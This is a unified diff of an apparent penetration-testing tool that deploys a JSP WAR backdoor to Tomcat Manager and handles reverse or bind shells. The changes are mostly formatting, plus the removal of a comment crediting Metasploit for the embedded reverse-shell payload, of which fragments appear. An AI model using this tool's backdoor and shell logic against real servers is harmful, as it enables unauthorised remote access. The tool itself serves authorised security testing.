@@ -1,4 +1,4 @@
-#!/usr/bin/python2
+#!/usr/bin/python
 from __future__ import print_function
 
 #
@@ -49,7 +49,6 @@ SHELLEVENT = threading.Event()
 SHELLSTATUS = threading.Event()
 SHELLTHREADQUIT = False
 
-
 # Logger configuration
 logging.basicConfig(format='%(levelname)s: %(message)s', level=logging.INFO)
 logging.addLevelName(
@@ -60,10 +59,8 @@ logging.addLevelName(
     logging.ERROR, "\033[1;41m%s\033[1;0m" % logging.getLevelName(logging.ERROR))
 logger = logging.getLogger()
 
-
 class MissingDependencyError(Exception):
     pass
-
 
 def shellLoop(sock):
     try:
@@ -108,7 +105,6 @@ def shellLoop(sock):
         SHELLSTATUS.clear()
         # Pass it down to the main function's except block.
         raise KeyboardInterrupt
-
 
 def shellHandler(mode, hostn, opts):
     logger.debug('Spawned shell handling thread. Awaiting for the event...')
@@ -155,7 +151,6 @@ def shellHandler(mode, hostn, opts):
     SHELLSTATUS.clear()
     return True
 
-
 def establishReverseTcpListener(sock, host, opts):
     logger.debug('Establishing listener for incoming reverse TCP shell at %s:%s' % (
         opts.host, opts.port))
@@ -180,7 +175,6 @@ def establishReverseTcpListener(sock, host, opts):
 
     return conn
 
-
 def connectToBindShell(sock, host, opts):
     SHELLEVENT.wait()
     logger.debug(
@@ -204,7 +198,6 @@ def connectToBindShell(sock, host, opts):
         return False
 
     return True
-
 
 def generateWAR(code, title, appname):
     dirpath = tempfile.mkdtemp()
@@ -292,7 +285,6 @@ Created-By: %s (Sun Microsystems Inc.)
 
     return (dirpath, outpath)
 
-
 def chooseShellFunctionality(opts):
     host = opts.host
     port = opts.port
@@ -305,7 +297,6 @@ def chooseShellFunctionality(opts):
         return 2
     else:
         return 0
-
 
 def prepareTcpShellCode(opts):
     host = opts.host
@@ -339,15 +330,6 @@ def prepareTcpShellCode(opts):
         logger.debug('No additional code for shell functionality requested.')
         return ''
 
-    #
-    # NOTICE:
-    #   The below code comes from the Rapid7 Metasploit-Framework, which in turn was based
-    #   on the code coming from: http://www.security.org.sg/code/jspreverse.html.
-    #   In order to refer to the original source, please look at the Metasploit core lib.
-    #   On Linux instances the file can be found at:
-    #       /usr/share/metasploit-framework/lib/msf/core/payload/jsp.rb
-    #
-    #
     payload = '''
 	<%%
 	  class StreamConnector extends Thread {
@@ -393,7 +375,6 @@ def prepareTcpShellCode(opts):
 	%%>''' % {'socketInvocation': socketInvocation}
 
     return payload
-
 
 def preparePayload(opts):
     logger.debug('Generating JSP WAR backdoor code...')
@@ -480,7 +461,6 @@ def preparePayload(opts):
 
     return payload
 
-
 def invokeApplication(browser, url, opts):
     appurl = os.path.join(url, opts.appname) + '/'
     logger.debug('Invoking application at url: "%s"' % appurl)
@@ -532,7 +512,6 @@ def invokeApplication(browser, url, opts):
 
     return False
 
-
 def deployApplication(browser, url, appname, warpath, modify_action=False):
     if not modify_action:
         logger.debug('Deploying application: %s from file: "%s"' %
@@ -572,7 +551,6 @@ def deployApplication(browser, url, appname, warpath, modify_action=False):
 
     return False
 
-
 def removeApplication(browser, url, appname):
     browser.open(url)
     for form in browser.forms():
@@ -583,7 +561,6 @@ def removeApplication(browser, url, appname):
             return True
 
     return False
-
 
 def checkIsDeployed(browser, url, appname):
     browser.open(url)
@@ -596,7 +573,6 @@ def checkIsDeployed(browser, url, appname):
             return True
 
     return False
-
 
 def unloadApplication(browser, url, appname):
     appurl = 'http://%s/%s/' % (url, appname)
@@ -618,7 +594,6 @@ def unloadApplication(browser, url, appname):
                     return True
 
     return False
-
 
 def validateManagerApplication(browser):
     found = 0
@@ -646,19 +621,16 @@ def validateManagerApplication(browser):
 
     return False
 
-
 def constructBaseUrl(host, url):
     host = host if host.startswith('http') else 'http://' + host
     uri = url[1:] if url.startswith('/') else url
     return os.path.join(host, uri)
-
 
 def extractHostAddress(hostn, url):
     host = constructBaseUrl(hostn, url)
     host = host[host.find('://') + 3:]
     host = host[:host.find('/')]
     return host
-
 
 def browseToManager(host, url, user, password):
 
@@ -723,10 +695,8 @@ def browseToManager(host, url, user, password):
 
     return browser, managerurl
 
-
 def generateRandomPassword(N=12):
     return ''.join(random.SystemRandom().choice(string.ascii_letters + string.digits) for _ in range(N))
-
 
 def options():
     version_banner = 'tomcatWarDeployer (v. %s)' % VERSION
@@ -839,7 +809,6 @@ Penetration Testing utility aiming at presenting danger of leaving Tomcat miscon
         logger.setLevel(logging.INFO)
 
     return (opts, args)
-
 
 def main():
     (opts, args) = options()
@@ -989,7 +958,6 @@ def main():
 
     except KeyboardInterrupt:
         print('\nUser interruption.')
-
 
 if __name__ == '__main__':
     main()
